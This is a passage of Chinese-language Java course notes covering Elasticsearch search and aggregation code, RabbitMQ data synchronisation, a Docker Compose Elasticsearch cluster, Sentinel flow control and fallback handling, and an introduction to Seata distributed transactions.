sortValues = hit.getSortValues(); if (sortValues != null && sortValues.length > 0) { hotelDoc.setDistance(sortValues[0]); } hotelDocList.add(hotelDoc); } //传入total和list pageResult.setTotal(total); pageResult.setList(hotelDocList); //返回结果 return pageResult; } catch (IOException e) { e.printStackTrace(); throw new RuntimeException(e); } } /** * 布尔搜索 */ private BoolQueryBuilder getBoolQueryBuilder(RequestParams params) { //设置搜索条件 BoolQueryBuilder boolQueryBuilder = new BoolQueryBuilder(); //搜索内容 String key = params.getKey(); //如果没有搜索内容，则搜索全部 if (StringUtils.isEmpty(key)) { boolQueryBuilder.must(QueryBuilders.matchAllQuery()); } else { boolQueryBuilder.must(QueryBuilders.matchQuery(\"all\", key)); } //添加过滤的条件 String city = params.getCity(); String brand = params.getBrand(); String starName = params.getStarName(); Integer minPrice = params.getMinPrice(); Integer maxPrice = params.getMaxPrice(); //城市 if (StringUtils.isNotEmpty(city)) { boolQueryBuilder.filter(QueryBuilders.termQuery(\"city\", city)); } //品牌 if (StringUtils.isNotEmpty(brand)) { boolQueryBuilder.filter(QueryBuilders.termQuery(\"brand\", brand)); } //星级 if (StringUtils.isNotEmpty(starName)) { boolQueryBuilder.filter(QueryBuilders.termQuery(\"starName\", starName)); } //价格 if (minPrice != null && maxPrice != null) { boolQueryBuilder.filter(QueryBuilders.rangeQuery(\"price\").gte(minPrice).lte(maxPrice)); } return boolQueryBuilder; } public Map> filters(RequestParams params) { try { //1.创建搜索请求 SearchRequest searchRequest = new SearchRequest(\"hotel\"); //2.设置搜索条件 //2.1添加布尔搜索 BoolQueryBuilder boolQueryBuilder = getBoolQueryBuilder(params); searchRequest.source().query(boolQueryBuilder); searchRequest.source().size(0); //2.2聚合查询条件 AggregationBuilder cityAggregation = AggregationBuilders.terms(\"cityAgg\").field(\"city\").size(100); AggregationBuilder starNameAggregation = AggregationBuilders.terms(\"starNameAgg\").field(\"starName\").size(100); AggregationBuilder brandAggregation = AggregationBuilders.terms(\"brandAgg\").field(\"brand\").size(100); searchRequest.source().aggregation(cityAggregation); searchRequest.source().aggregation(starNameAggregation); searchRequest.source().aggregation(brandAggregation); //3.发送请求 SearchResponse response = highLevelClient.search(searchRequest, RequestOptions.DEFAULT); //4.处理响应 //4.1自定义一个方法处理响应结果，得到聚合的数据 List cityList = handlerAgg(response,\"cityAgg\"); List starNameList = handlerAgg(response,\"starNameAgg\"); List brandList = handlerAgg(response,\"brandAgg\"); //4.2定义一个结果集返回 Map> resultMap = new HashMap<>(); resultMap.put(\"city\",cityList); resultMap.put(\"starName\",starNameList); resultMap.put(\"brand\",brandList); return resultMap; } catch (IOException e) { e.printStackTrace(); throw new RuntimeException(e); } } /** * 自定义一个方法处理响应结果，得到聚合的数据 */ private List handlerAgg(SearchResponse response, String aggName) { //1，根据聚合的名字得到聚合的结果 Terms terms = response.getAggregations().get(aggName); //2. 得到Buckets,遍历Buckets把结果存储到List集合中 List buckets = terms.getBuckets(); ArrayList list = new ArrayList<>(); for (Terms.Bucket bucket : buckets) { list.add(bucket.getKey().toString()); } //3.返回结果集 return list; } public List suggestion(String key) { try { //创建搜索请求 SearchRequest searchRequest = new SearchRequest(\"hotel\"); searchRequest.source().size(0); //设置搜索参数,设置内容补全查询条件 SuggestBuilder suggestBuilder = new SuggestBuilder(); //hotelSuggestion是自定义的名字 suggestBuilder.addSuggestion(\"hotelSuggestion\", SuggestBuilders.completionSuggestion(\"suggestion\").prefix(key).skipDuplicates(true).size(20)); searchRequest.source().suggest(suggestBuilder); //发出请求 SearchResponse response = highLevelClient.search(searchRequest, RequestOptions.DEFAULT); //处理响应,把匹配到内容存储到LIst集合中返回 ArrayList resultList = new ArrayList<>(); CompletionSuggestion hotelSuggestion = response.getSuggest().getSuggestion(\"hotelSuggestion\"); List options = hotelSuggestion.getOptions(); for (CompletionSuggestion.Entry.Option option : options) { resultList.add(option.getText().toString()); } return resultList; } catch (IOException e) { e.printStackTrace(); throw new RuntimeException(e); } } @Override public void insertById(Long id) { Hotel hotel = hotelMapper.selectById(id); HotelDoc hotelDoc = new HotelDoc(hotel); String json = JSON.toJSONString(hotelDoc); IndexRequest request = new IndexRequest(\"hotel\").id(hotelDoc.getId().toString()); request.source(json, XContentType.JSON); try { highLevelClient.index(request,RequestOptions.DEFAULT); } catch (IOException e) { e.printStackTrace(); } } @Override public void deleteById(Long id) { DeleteRequest request = new DeleteRequest(\"hotel\").id(String.valueOf(id)); try { highLevelClient.delete(request,RequestOptions.DEFAULT); } catch (IOException e) { e.printStackTrace(); } } } 数据同步 方案分析 常见的数据同步方案有三种： 同步调用 优点：实现简单，粗暴 缺点：业务耦合度高，响应速度慢 MQ异步通知 优点：低耦合，实现难度一般 缺点：依赖mq的可靠性 Canal监听binlog 优点：完全解除服务间耦合 缺点：开启binlog增加数据库负担、实现复杂度高，只能在MySQL使用 功能实现 导入依赖 org.springframework.boot spring-boot-starter-amqp 在application.yml添加RabbitMQ配置 spring: rabbitmq: host: 192.168.32.129 port: 5672 virtual-host: / username: root password: root 创建交换机和队列 ==生产者和消费者两边都要创建交换机和队列== 声明交换机和队列的名称 package cn.itcast.hotel.constants; public class MQConstants { /** * 交换机 */ public final static String HOTEL_EXCHANGE = \"hotel.direct\"; /** * 监听新增和修改的队列 */ public final static String HOTEL_INSERT_QUEUE = \"hotel.insert.queue\"; /** * 监听删除的队列 */ public final static String HOTEL_DELETE_QUEUE = \"hotel.delete.queue\"; /** * 新增或修改的RoutingKey */ public final static String HOTEL_INSERT_KEY = \"hotel.insert\"; /** * 删除的RoutingKey */ public final static String HOTEL_DELETE_KEY = \"hotel.delete\"; } 定义配置类，声明交换机和队列 ```java package cn.itcast.hotel.config; @Configuration public class RabbitConfig { //交换机 @Bean public DirectExchange directExchange(){ return new DirectExchange(MQConstants.HOTEL_EXCHANGE); } // 插入与更新的队列 @Bean public Queue insertQueue(){ return new Queue(MQConstants.HOTEL_INSERT_QUEUE); } // 插入与更新的队列 @Bean public Queue deleteQueue(){ return new Queue(MQConstants.HOTEL_DELETE_QUEUE); } //把插入队列绑定到交换机上 @Bean public Binding insertQueueToExchange(DirectExchange directExchange,Queue insertQueue){ return BindingBuilder.bind(insertQueue).to(directExchange).with(MQConstants.HOTEL_INSERT_KEY); } //把删除队列绑定到交换上 @Bean public Binding deleteQueueToExchange(DirectExchange directExchange,Queue deleteQueue){ return BindingBuilder.bind(deleteQueue).to(directExchange).with(MQConstants.HOTEL_DELETE_KEY); } } ##### 生产者发送MQ消息 - 在增删改业务中分别发送MQ消息 ```java package cn.itcast.hotel.web; @RestController @RequestMapping(\"hotel\") public class HotelController { @Autowired private IHotelService hotelService; @Autowired private RabbitTemplate rabbitTemplate; @PostMapping public void saveHotel(@RequestBody Hotel hotel){ hotelService.save(hotel); //发送消息 /** * 参数一：交换机名称 * 参数二：routingKey名称 * 参数三：消息内容 */ rabbitTemplate.convertAndSend(MQConstants.HOTEL_EXCHANGE,MQConstants.HOTEL_INSERT_KEY,hotel.getId()); } @PutMapping() public void updateById(@RequestBody Hotel hotel){ if (hotel.getId() == null) { throw new InvalidParameterException(\"id不能为空\"); } hotelService.updateById(hotel); //发送消息 /** * 参数一：交换机名称 * 参数二：routingKey名称 * 参数三：消息内容 */ rabbitTemplate.convertAndSend(MQConstants.HOTEL_EXCHANGE,MQConstants.HOTEL_INSERT_KEY,hotel.getId()); } @DeleteMapping(\"/{id}\") public void deleteById(@PathVariable(\"id\") Long id) { hotelService.removeById(id); //发送消息 /** * 参数一：交换机名称 * 参数二：routingKey名称 * 参数三：消息内容 */ rabbitTemplate.convertAndSend(MQConstants.HOTEL_EXCHANGE,MQConstants.HOTEL_DELETE_KEY,id); } } 消费者监听MQ 导入依赖 添加配置 编写监听器 package cn.itcast.hotel.listener; import cn.itcast.hotel.constants.MQConstants; import cn.itcast.hotel.service.IHotelService; import org.springframework.amqp.rabbit.annotation.RabbitListener; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.context.annotation.Configuration; @Configuration public class HotelListener { @Autowired private IHotelService hotelService; @RabbitListener(queues = MQConstants.HOTEL_INSERT_QUEUE) public void listenerInserQueue(Long id){ hotelService.insertById(id); } @RabbitListener(queues = MQConstants.HOTEL_DELETE_QUEUE) public void listenerDeleteQueue(Long id){ hotelService.deleteById(id); } } 实现业务 @Override public void insertById(Long id) { try { Hotel hotel = getById(id); HotelDoc hotelDoc = new HotelDoc(hotel); String json = mapper.writeValueAsString(hotelDoc); IndexRequest request = new IndexRequest(\"hotel\").id(hotelDoc.getId().toString()); request.source(json, XContentType.JSON); highLevelClient.index(request,RequestOptions.DEFAULT); } catch (Exception e) { e.printStackTrace(); throw new RuntimeException(e); } } @Override public void deleteById(Long id) { try { DeleteRequest request = new DeleteRequest(\"hotel\").id(id.toString()); highLevelClient.delete(request,RequestOptions.DEFAULT); } catch (Exception e) { e.printStackTrace(); throw new RuntimeException(e); } } Elasticsearch集群 相关概念： 节点（node) ：集群中的一个 Elasticearch 服务实例。在Elasticsearch中，节点的类型主要分为如下三种： master eligible节点：有资格参加选举成为Master的节点，默认为true（可以通过node.master: false设置）。 data节点：保存数据的节点，默认为true（可以通过node.data: false设置）。 Coordinating 节点：客户端节点。负责接收客户端请求，将请求发送到合适的节点，最终把结果汇集到一起返回，默认为true。 集群（cluster）：一组拥有相同集群名称的节点，集群名称默认是elasticsearch。 索引（index) ：es存储数据的地方，相当于关系数据库中的database。 分片（shard）：索引库可以被拆分为不同的部分进行存储，称为分片。在集群环境下，一个索引库的不同分片可以拆分到放到不同的节点中，分片的好处有如下两点。==主分片和副本分片永远不会分配在同一个节点上== 提高查询性能（多个节点并行查询） 提高数据安全性（鸡蛋不要放在一个篮子里） 主分片（Primary shard）：相对于副本分片的定义。 副本分片（Replica shard）：即对主分片数据的备份()，每个主分片可以有一个或者多个副本，数据和主分片一样，副本的好处有如下两点： 数据备份，防止数据丢失 一定程度提高查询的并发能力（同一份完整的索引库的数据，分成了两份，都可以查询） 路由原理 文档存入对应的分片，ES计算分片编号的过程，称为路由。 路由算法 ：shard_index（分片编号） = hash(文档id) % number_of_primary_shards（主分片个数） 脑裂问题 一个正常es集群中只有一个主节点（Master），主节点负责管理整个集群。如创建或删除索引，并决定哪些分片分配给哪些节点。 脑裂就是一个集群出现多个主节点从而使集群分裂，使得集群处于异常状态。 脑裂原因 网络原因：网络延迟、网络波动 一般es集群会在内网部署，也可能在外网部署，比如阿里云。 内网一般不会出现此问题，外网的网络出现问题的可能性大些。 Master节点负载 主节点的角色既为master又为data。数据访问量较大时，可能会导致Master节点停止响应（假死状态）。 JVM内存回收 当Master节点设置的JVM内存较小时，引发JVM的大规模内存回收，造成ES进程失去响应 避免脑裂 网络原因：discovery.zen.ping.timeout 超时时间配置大一点。 节点负载：角色分离策略 主节点配置： node.master: true # 是否有资格参加选举成为master node.data: false # 是否存储数据 数据节点配置： node.master: false # 是否有资格参加选举成为master node.data: true # 是否存储数据 JVM内存回收：修改 config/jvm.options 文件的 -Xms 和 -Xmx 为服务器的物理内存一半。 还可以在选举层面解决脑裂问题（即不让第二个老大产生）： # 声明获4得大于几票，主节点才有效，请设置为（master eligble nodes / 2） + 1 discovery.zen.minimum_master_nodes: 5 故障迁移 集群的master节点会监控集群中的节点状态，如果发现有节点宕机，会立即将宕机节点的分片数据迁移到其它节点，确保数据安全，这个叫做故障转移。 搭建集群环境(了解) 创建相应目录 mkdir /root/es-cluster cd /root/es-cluster mkdir -p es01/data mkdir -p es01/logs mkdir -p es02/data mkdir -p es02/logs mkdir -p es03/data mkdir -p es03/logs mkdir -p kibana_config 创建docker-compose.yml version: '3' services: es01: image: elasticsearch:7.4.0 container_name: es01 environment: - node.name=es01 - cluster.name=es-docker-cluster - discovery.seed_hosts=es02,es03 - cluster.initial_master_nodes=es01,es02,es03 - bootstrap.memory_lock=true - \"ES_JAVA_OPTS=-Xms512m -Xmx512m\" ulimits: memlock: soft: -1 hard: -1 volumes: - ./es01/data:/usr/share/elasticsearch/data - ./es01/logs:/usr/share/elasticsearch/logs - /usr/share/elasticsearch/plugins/:/usr/share/elasticsearch/plugins/ - ./elasticsearch.yml:/usr/share/elasticsearch/config/elasticsearch.yml ports: - 9201:9200 networks: - elastic es02: image: elasticsearch:7.4.0 container_name: es02 environment: - node.name=es02 - cluster.name=es-docker-cluster - discovery.seed_hosts=es01,es03 - cluster.initial_master_nodes=es01,es02,es03 - bootstrap.memory_lock=true - \"ES_JAVA_OPTS=-Xms512m -Xmx512m\" ulimits: memlock: soft: -1 hard: -1 volumes: - ./es02/data:/usr/share/elasticsearch/data - ./es02/logs:/usr/share/elasticsearch/logs - /usr/share/elasticsearch/plugins/:/usr/share/elasticsearch/plugins/ - ./elasticsearch.yml:/usr/share/elasticsearch/config/elasticsearch.yml ports: - 9202:9200 networks: - elastic es03: image: elasticsearch:7.4.0 container_name: es03 environment: - node.name=es03 - cluster.name=es-docker-cluster - discovery.seed_hosts=es01,es02 - cluster.initial_master_nodes=es01,es02,es03 - bootstrap.memory_lock=true - \"ES_JAVA_OPTS=-Xms512m -Xmx512m\" ulimits: memlock: soft: -1 hard: -1 volumes: - ./es03/data:/usr/share/elasticsearch/data - ./es03/logs:/usr/share/elasticsearch/logs - /usr/share/elasticsearch/plugins/:/usr/share/elasticsearch/plugins/ - ./elasticsearch.yml:/usr/share/elasticsearch/config/elasticsearch.yml ports: - 9203:9200 networks: - elastic kibana01: image: kibana:7.4.0 container_name: kibana01 links: - es01 - es02 - es03 ports: - 5602:5601 volumes: - ./kibana_config/:/usr/local/kibana/config/ environment: ELASTICSEARCH_HOSTS: http://es01:9200 networks: - elastic networks: elastic: driver: bridge 创建elasticsearch.yml文件 network.host: 0.0.0.0 http.cors.enabled: true http.cors.allow-origin: \"*\" 运行docker-compose命令 docker-compose up -d 安装cerebro监控ES集群，访问：http://192.168.174.129:9000/ docker search cerebro docker pull yannart/cerebro docker run -d --name cerebro -p 9000:9000 yannart/cerebro 创建一个test索引库，指定分片数为3，副本数为1 PUT test { \"settings\": { \"number_of_shards\": 3 , \"number_of_replicas\": 1 } } Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2023-02-28 10:59 "},"Java笔记/Day60-Sentinel.html":{"url":"Java笔记/Day60-Sentinel.html","title":"Day60-Sentinel","keywords":"","body":"雪崩问题 微服务之间相互调用，因为调用链中的一个服务故障，引起整个链路都无法访问的情况。 解决雪崩问题的常见方式： 避免因瞬间高并发流量而导致（预防措施） 流量控制：限制业务访问的QPS，避免服务因流量的突增而故障 避免因服务故障而导致（补救措施） 超时处理：设定超时时间，请求超过一定时间没有响应就返回错误信息 线程隔离（舱壁模式）：限定每个业务能使用的线程数，避免耗尽整个服务器资源 熔断降级：由断路器统计业务执行的异常比例，如果超出阈值则会熔断该业务，拦截访问该业务的一切请求 Sentinel 服务保护技术对比 | | Sentinel | Hystrix | | ---------------- | ---------------------------------------------- | ----------------------------- | | 隔离策略 | 信号量隔离 | 线程池隔离/信号量隔离 | | 熔断降级策略 | 基于慢调用比例或异常比例 | 基于失败比率 | | 实时指标实现 | 滑动窗口 | 滑动窗口（基于 RxJava） | | 规则配置 | 支持多种数据源 | 支持多种数据源 | | 扩展性 | 多个扩展点 | 插件的形式 | | 基于注解的支持 | 支持 | 支持 | | 限流 | 基于 QPS，支持基于调用关系的限流 | 有限的支持 | | 流量整形 | 支持慢启动、匀速排队模式 | 不支持 | | 系统自适应保护 | 支持 | 不支持 | | 控制台 | 开箱即用，可配置规则、查看秒级监控、机器发现等 | 不完善 | | 常见框架的适配 | Servlet、Spring Cloud、Dubbo、gRPC 等 | Servlet、Spring Cloud Netflix | 安装Sentinel https://github.com/alibaba/Sentinel/releases 将jar包放到任意非中文目录，执行命令： java -jar sentinel-dashboard-1.8.4.jar 修改端口 java -Dserver.port=8090 -jar sentinel-dashboard-1.8.4.jar | 配置项 | 默认值 | 说明 | | -------------------------------- | -------- | ---------- | | server.port | 8080 | 服务端口 | | sentinel.dashboard.auth.username | sentinel | 默认用户名 | | sentinel.dashboard.auth.password | sentinel | 默认密码 | 访问http://localhost:8080页面登录，账号和密码默认都是：sentinel 微服务整合Sentinel 导入依赖 com.alibaba.cloud spring-cloud-starter-alibaba-sentinel 添加配置内容 spring: cloud: sentinel: transport: dashboard: localhost:8080 web-context-unify: false # 关闭context整合 访问微服务的任意端点，这样才能触发sentinel的监控 流量控制 当请求进入微服务时，首先会访问DispatcherServlet，然后进入Controller、Service、Mapper，这样的一个调用链就叫做簇点链路。簇点链路中被监控的每一个接口就是一个资源。 Sentinel默认只标记Controller中的方法为资源，如果要标记其它方法，需要利用@SentinelResource(\"自定义标识\")注解。 Sentinel默认会将Controller方法做context整合，导致链路模式的流控失效，需要修改application.yml，添加配置。 流控模式 直接：统计当前资源的请求，触发阈值时对当前资源直接限流 关联：统计与当前资源相关的另一个资源，触发阈值时，对当前资源限流 两个有竞争关系的资源 一个优先级较高（不限流），一个优先级低（限流） 如下图：对/order/query端点进行限流，当/update资源访问量触发阈值时，就会对/query资源限流，避免影响update 链路：统计从指定链路访问到本资源的请求，触发阈值时，对指定链路限流 ==注意：==Sentinel默认会将Controller方法做context整合，导致链路模式的流控失效，需要修改application.yml 如下图：只统计从/order/query进入/goods的资源，超出阈值则被限流 流控效果 快速失败：QPS超过阈值时，拒绝新的请求，并抛出FlowException异常 warm up：预热模式，对超出阈值的请求同样是拒绝并抛出异常。但这种模式阈值会动态变化，从一个较小值逐渐增加到最大阈值 排队等待：可以使得QPS会变的很平滑，请求会进入队列，按照阈值允许的时间间隔依次执行请求；如果请求预期等待时长大于超时时间，直接拒绝 热点参数限流 在实际开发中，可能部分商品是热点商品，例如秒杀商品，我们希望这部分商品的QPS限制与其它商品不一样，高一些。那就需要配置热点参数限流。 ==注意==：sentinel点击簇点链路的右侧添加热点存在bug，需要点击左侧菜单中热点规则菜单创建 注意事项：热点参数限流对默认的SpringMVC资源无效，需要利用@SentinelResource(\"自定义标识\")注解标记资源 例如：给/order/{orderId}这个资源添加热点参数限流 默认QPS为2 102参数QPS为4 103参数QPS为10 线程隔离&熔断降级 不管是线程隔离还是熔断降级，都是对客户端（调用方）的保护。需要在调用方发起远程调用时做线程隔离、或者服务熔断。 FeignClient整合Sentinel 而我们的微服务远程调用都是基于Feign来完成的，因此我们需要将Feign与Sentinel整合，在Feign里面实现线程隔离和服务熔断。 修改配置，开启sentinel功能 feign: sentinel: enabled: true # 开启feign对sentinel的支持 编写失败降级逻辑 方式一：FallbackClass，无法对远程调用的异常做处理 方式二：FallbackFactory，可以对远程调用的异常做处理 失败降级兜底实现步骤 步骤一：在feign-api项目的fallback包中定义类，实现FallbackFactory==【注意泛型】== package cn.itcast.feign.fallback; import cn.itcast.feign.client.UserClient; import cn.itcast.feign.pojo.User; import feign.hystrix.FallbackFactory; import lombok.extern.slf4j.Slf4j; @Slf4j public class UserClientFallbackFactory implements FallbackFactory { @Override public UserClient create(Throwable throwable) { return new UserClient() { @Override public User queryById(Long id) { log.error(\"查询用户异常\", throwable); //使得用户侧不再显示报错，而是显示返回数据中的user为null return new User(); } }; } } 步骤二：在feign-api项目的config包中FeignConfiguration类中将UserClientFallbackFactory注册为一个Bean @Bean public UserClientFallbackFactory userClientFallbackFactory(){ //失败降级逻辑 return new UserClientFallbackFactory(); } 步骤三：在feign-api项目中的UserClient接口中使用UserClientFallbackFactory package cn.itcast.feign.client; import cn.itcast.feign.config.FeignConfiguration; import cn.itcast.feign.fallback.UserClientFallbackFactory; import cn.itcast.feign.pojo.User; import org.springframework.cloud.openfeign.FeignClient; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.PathVariable; @FeignClient(value = \"userservice\", //指定服务名称 configuration = FeignConfiguration.class, //局部设置日志级别 fallbackFactory = UserClientFallbackFactory.class) //失败降级处理 public interface UserClient { @GetMapping(\"/user/{id}\") public User queryById(@PathVariable(\"id\") Long id); } 线程隔离 线程隔离有两种方式实现： 线程池隔离：给每个服务调用业务分配一个线程池，利用线程池本身实现隔离效果 优点：支持自动超时、支持异步调用 缺点：线程的额外开销比较大 场景：低扇出 信号量隔离（Sentinel默认采用）：不创建线程池，而是计数器模式，记录业务使用的线程数量，达到信号量上限时，禁止新的请求 优点：轻量级，无额外开销 缺点：不支持主动超时、不支持异步调用 场景：高频调用、高扇出 熔断降级 断路器熔断策略有三种：慢调用、异常比例、异常数 慢调用：业务的响应时长（RT）大于指定时长的请求认定为慢调用请求。在指定时间内，如果请求数量超过设定的最小数量，慢调用比例大于设定的阈值，则触发熔断。 异常比例&异常数：统计指定时间内的调用，如果调用次数超过指定请求数，并且出现异常的比例达到设定的比例阈值（或超过指定异常数），则触发熔断。 状态机的三个状态 closed：关闭状态，断路器放行所有请求，并开始统计异常比例、慢请求比例。超过阈值则切换到open状态 open：打开状态，服务调用被熔断，访问被熔断服务的请求会被拒绝，快速失败，直接走降级逻辑。Open状态5秒后会进入half-open状态 half-open：半开状态，放行一次请求，根据执行结果来判断接下来的操作 请求成功：则切换到closed状态 请求失败：则切换到open状态 授权规则 授权规则可以对调用方的来源做控制，有白名单和黑名单两种方式 默认情况下，sentinel不管请求者从哪里来，请求者的origin返回值永远是default。因此，我们需要自定义定义一个RequestOriginParser的实现类，让不同的请求，返回不同的origin。 package cn.itcast.order.sentinel; import com.alibaba.csp.sentinel.adapter.spring.webmvc.callback.RequestOriginParser; import org.springframework.stereotype.Component; import org.springframework.util.StringUtils; import javax.servlet.http.HttpServletRequest; @Component public class HeaderOriginParser implements RequestOriginParser { @Override public String parseOrigin(HttpServletRequest request) { // 1.获取请求头 String origin = request.getHeader(\"origin\"); // 2.非空判断 if (StringUtils.isEmpty(origin)) { origin = \"blank\"; } return origin; } } 添加网关配置，让所有从gateway路由到微服务的请求都带上origin头 spring: cloud: gateway: # 默认过滤器（对所有请求有效） default-filters: # 给所有经过网关的请求添加gateway请求头 - AddRequestHeader=origin,gateway 在sentinel添加一个授权规则，放行origin值为gateway的请求 自定义异常结果 默认情况下，发生限流、降级、授权拦截时，都会抛出异常到调用方。异常结果都是flow limmiting（限流）。这样不够友好，无法得知是限流还是降级还是授权拦截。 默认处理请求被限流、降级、授权拦截时抛出的异常：BlockException，其中包含的子类 | 异常 | 说明 | | -------------------- | ------------------ | | FlowException | 限流异常 | | ParamFlowException | 热点参数限流的异常 | | DegradeException | 降级异常 | | AuthorityException | 授权规则异常 | | SystemBlockException | 系统规则异常 | 如果要自定义异常时的返回结果，需要实现BlockExceptionHandler接口 package cn.itcast.order.sentinel; import com.alibaba.csp.sentinel.adapter.spring.webmvc.callback.BlockExceptionHandler; import com.alibaba.csp.sentinel.slots.block.BlockException; import com.alibaba.csp.sentinel.slots.block.authority.AuthorityException; import com.alibaba.csp.sentinel.slots.block.degrade.DegradeException; import com.alibaba.csp.sentinel.slots.block.flow.FlowException; import com.alibaba.csp.sentinel.slots.block.flow.param.ParamFlowException; import org.springframework.stereotype.Component; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; @Component public class SentinelExceptionHandler implements BlockExceptionHandler { @Override public void handle(HttpServletRequest request, HttpServletResponse response, BlockException e) throws Exception { String msg = \"未知异常\"; int status = 429; //请求过多 if (e instanceof FlowException) { msg = \"请求被限流了\"; } else if (e instanceof ParamFlowException) { msg = \"请求被热点参数限流\"; } else if (e instanceof DegradeException) { msg = \"请求被降级了\"; } else if (e instanceof AuthorityException) { msg = \"没有权限访问\"; status = 401; } //返回异常信息 //{\"msg\":\"msg\",\"status\":\"status\"} response.setContentType(\"application/json;charset=utf-8\"); response.setStatus(status); response.getWriter().write(\"{\\\"msg\\\":\\\"\"+msg+\"\\\",\\\"status\\\":\\\"\"+status+\"\\\"}\"); } } 规则持久化 sentinel的所有规则都是内存存储，重启后所有规则都会丢失。在生产环境下，我们必须确保这些规则的持久化，避免丢失 sentinel支持三种规则管理模式 | 推送模式 | 说明 | 优点 | 缺点 | | ------------------------------------------------------------ | ------------------------------------------------------------ | ---------------------------- | ------------------------------------------------------------ | | 原始模式 | API 将规则推送至客户端并直接更新到内存中，扩展写数据源（WritableDataSource），默认就是这种 | 简单，无任何依赖 | 不保证一致性；规则保存在内存中，重启即消失。严重不建议用于生产环境 | | Pull 模式 | 扩展写数据源（WritableDataSource）， 客户端主动向某个规则管理中心定期轮询拉取规则，这个规则中心可以是 RDBMS、文件 等 | 简单，无任何依赖；规则持久化 | 不保证一致性；实时性不保证，拉取过于频繁也可能会有性能问题。 | | Push 模式 | 扩展读数据源（ReadableDataSource），规则中心统一推送，客户端通过注册监听器的方式时刻监听变化，比如使用 Nacos、Zookeeper 等配置中心。这种方式有更好的实时性和一致性保证。生产环境下一般采用 push 模式的数据源。 | 规则持久化；一致性； | 引入第三方依赖 | 实现push模式持久化 导入sentinel监听nacos的依赖依赖 com.alibaba.csp sentinel-datasource-nacos 在微服务中配置nacos地址及监听的配置信息 spring: cloud: sentinel: datasource: flow: nacos: server-addr: localhost:8848 # nacos地址 dataId: orderservice-flow-rules # 在nacos里的配置文件名称 groupId: SENTINEL_GROUP rule-type: flow # 还可以是：degrade、authority、param-flow 启动sentinel java -jar sentinel-dashboard.jar Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2023-02-07 17:26 "},"Java笔记/Day61-Seata.html":{"url":"Java笔记/Day61-Seata.html","title":"Day61-Seata","keywords":"","body":"分布式事务 本地事务 ACID 原子性：事务是不可分割的最小操作单位，要么同时成功，要么同时失败 一致性：使得数据库从一种正确状态转换成另一种正确状态 隔离性：在事务正确提交之前，不允许把该事务对数据的任何改变提供给任何其他事务 持久性：对数据库做的一切修改将永久保存，不论是否出现故障 分布式事务 跨 数据源 或 服务 的分布式事务。在数据库水平拆分、服务垂直拆分之后，一个业务操作通常要跨多个数据库、服务才能完成。 CAP定理 在分布式系统中，系统间的网络不能100%保证健康，一定会有故障的时候，而服务又必须对外保证服务。因此Partition Tolerance不可避免。 如果此时要保证一致性，就必须等待网络恢复，完成数据同步后，整个集群才对外提供服务，服务处于阻塞状态，不可用。 如果此时要保证可用性，就不能等待网络恢复，那分区之间就会出现数据不一致。 分布式系统的三个指标，不可能同时做到。在P一定要保证的情况下，A和C之间只能实现一个。 Consistency：一致性 Availability：可用性 Partition tolerance：分区容错性 BASE理论 BASE理论是对CAP的一种解决思路，包含三个思想： Basically Available （基本可用）：分布式系统在出现故障时，允许损失部分可用性，即保证核心可用。 Soft State（软状态）：在一定时间内，允许出现中间状态，比如临时的不一致状态。 Eventually Consistent（最终一致性）：虽然无法保证强一致性，但是在软状态结束后，最终达到数据一致。 解决分布式事务的思路 AP模式：各子事务分别执行和提交，允许出现结果临时不一致，然后采用弥补措施恢复数据即可，实现最终一致。（软状态 + 最终一致性） CP模式：各个子事务执行后互相等待，同时提交，同时回滚，达成强一致。但事务等待过程中，处于弱可用状态。（基本可用） Seata Seata架构： TC (Transaction Coordinator) - 事务协调者：维护全局和分支事务的状态，协调全局事务提交或回滚。 TM (Transaction Manager) - 事务管理器：定义全局事务的范围、开始全局事务、提交或回滚全局事务。 RM (Resource Manager) - 资源管理器：管理分支事务处理的资源，向TC注册分支事务和报告分支事务的状态，并驱动分支事务提交或回滚。 四种分布式事务解决方案对比 XA AT TCC SAGA 一致性 强一致 弱一致 最终一致 隔离性 完全隔离 居于全局锁隔离 基于资源预留隔离 无隔离 代码侵入 无 无 有，要编写try、confirm、cancel三个接口 有，要编写状态机和补偿业务 性能 差 好 非常好 非常好 特点 依赖数据库机制实现回滚 依赖数据快照实现数据恢复 使用数据补偿机制，不依赖数据库事务；无需生成快照，无需使用全局锁 场景 对一致性、隔离性要求高的业务 - Seata默认模式- 基于关系型数据库的大多数分布式事务场景 - 对性能要求较高的事务- 有非关系型数据库参与的事务 - 业务流程长、业务流程多- 参与者包含其他公司或遗留系统服务，无法提供TCC模式要求的三个接口 微服务集成Seata 导入依赖 com.alibaba.cloud spring-cloud-starter-alibaba-seata seata-spring-boot-starter io.seata io.seata seata-spring-boot-starter ${seata.version} 在参与事务的每个微服务的application.yml中，配置TC服务信息 namespace为空，就是默认的public，结合起来，TC服务的信息就是：public@DEFAULT_GROUP@seata-tc-server@GZ，这样就能确定TC服务集群了。然后就可以去Nacos拉取对应的实例信息 seata: registry: # TC服务注册中心的配置，微服务根据这些信息去注册中心获取tc服务地址 type: nacos # 注册中心类型 nacos nacos: server-addr: 127.0.0.1:8848 # nacos地址 namespace: \"\" # namespace，默认为空 group: DEFAULT_GROUP # 分组，默认是DEFAULT_GROUP application: seata-server # seata服务名称 username: nacos password: nacos tx-service-group: seata-demo # 事务组名称 service: vgroup-mapping: # 事务组与cluster的映射关系 seata-demo: GZ # 【注意】事务组名称一致 XA模式 优缺点 XA模式的优点 事务的强一致性，满足ACID原则 常用数据库都支持，实现简单，并且没有代码侵入 XA模式的缺点 因为一阶段需要锁定数据库资源，等待第二阶段结束才释放，性能较差 依赖关系型数据库实现事务 实现XA模式 创建名为seata的数据库，建立branch_table和global_table两张表 SET NAMES utf8mb4; SET FOREIGN_KEY_CHECKS = 0; -- ---------------------------- -- 分支事务表 -- ---------------------------- DROP TABLE IF EXISTS `branch_table`; CREATE TABLE `branch_table` ( `branch_id` bigint(20) NOT NULL, `xid` varchar(128) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL, `transaction_id` bigint(20) NULL DEFAULT NULL, `resource_group_id` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL, `resource_id` varchar(256) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL, `branch_type` varchar(8) CHARACTER SET utf8 COLLATE utf8_general_ci 